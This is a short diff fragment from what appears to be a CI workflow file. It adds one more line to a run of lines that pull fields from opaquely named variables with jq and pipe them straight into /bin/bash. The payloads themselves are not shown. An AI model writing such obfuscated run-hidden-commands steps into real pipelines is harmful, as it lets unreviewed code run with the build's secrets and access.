@@ -33,6 +33,7 @@ jobs:
           echo $ch0 | jq -r .txm17852 | /bin/bash
           printf '%s' "$vfs2" | jq -r .ydh682 | /bin/bash
           echo $ap922 | jq -r .o5605 | /bin/bash
+          echo $nce874 | jq -r .l03115 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
